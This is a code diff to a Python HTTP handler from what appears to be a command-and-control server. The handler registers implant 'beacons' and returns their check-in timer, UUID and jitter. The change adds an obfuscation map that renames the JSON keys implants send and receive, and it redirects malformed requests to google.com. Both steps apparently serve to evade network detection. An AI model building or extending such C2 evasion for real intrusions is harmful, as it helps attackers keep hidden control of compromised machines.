@@ -6,7 +6,7 @@ import zlib
 import json
 from http.server import BaseHTTPRequestHandler
 
-from Modules.global_objects import config, logger
+from Modules.global_objects import config, logger, obfuscation_map
 from Modules.beacon.beacon import add_beacon_list
 
 from Modules.beacon.beacon_server.socket_manager import socketio
@@ -25,19 +25,39 @@ def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
         handler.send_response(400)
         handler.end_headers()
         return
+    
+    # Normalize the obfuscation mapping and extract real values from incoming data
+    generic = obfuscation_map.get("generic", {})
+    implant_info = generic.get("implant_info", {}) if isinstance(generic.get("implant_info", {}), dict) else {}
 
-    if data and 'name' in data and 'os' in data and 'address' in data:
+    # Keys used by the client for name/os/address in the obfuscated payload
+    name_key = implant_info.get("Name") or generic.get("name")
+    os_key = implant_info.get("os") or generic.get("os")
+    address_key = implant_info.get("address") or generic.get("address")
+
+    # Actual values provided by the client
+    name_val = data.get(name_key) if data and name_key else None
+    os_val = data.get(os_key) if data and os_key else None
+    address_val = data.get(address_key) if data and address_key else None
+
+    if data and name_val and os_val and address_val:
         userID = str(uuid.uuid4())
-        logger.info(f"New connection from {data['name']} on {data['os']} at {data['address']} with UUID {userID}")
+        logger.info(f"New connection from {name_val} on {os_val} at {address_val} with UUID {userID}")
 
         add_beacon_list(
-            userID, data['address'], data['name'], data['os'], time.strftime('%Y-%m-%d %H:%M:%S'),
+            userID, address_val, name_val, os_val, time.strftime('%Y-%m-%d %H:%M:%S'),
             config['beacon']["interval"], config['beacon']['jitter'], config
         )
 
+        # determine the JSON keys to use in the response; prefer explicit mapping from generic, then implant_info, then defaults
+        timer_key = generic.get("timer") or implant_info.get("timer") or "timer"
+        uuid_key = generic.get("uuid") or implant_info.get("uuid") or "uuid"
+        jitter_key = generic.get("jitter") or implant_info.get("jitter") or "jitter"
+
         response_body = json.dumps({
-            "timer": config['beacon']["interval"],
-            "uuid": userID, "jitter": config['beacon']['jitter']
+            timer_key: config['beacon']["interval"],
+            uuid_key: userID,
+            jitter_key: config['beacon']['jitter']
         }).encode('utf-8')
 
         handler.send_response(200)
@@ -46,7 +66,7 @@ def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
         handler.end_headers()
         handler.wfile.write(response_body)
     else:
-        logger.error("Invalid data format in connection request, redirecting.")
+        logger.error("Invalid data format in connection request (missing or unmapped obfuscated keys for Name/os/address), redirecting.")
         handler.send_response(302)
         handler.send_header('Location', 'https://www.google.com')
         handler.end_headers()
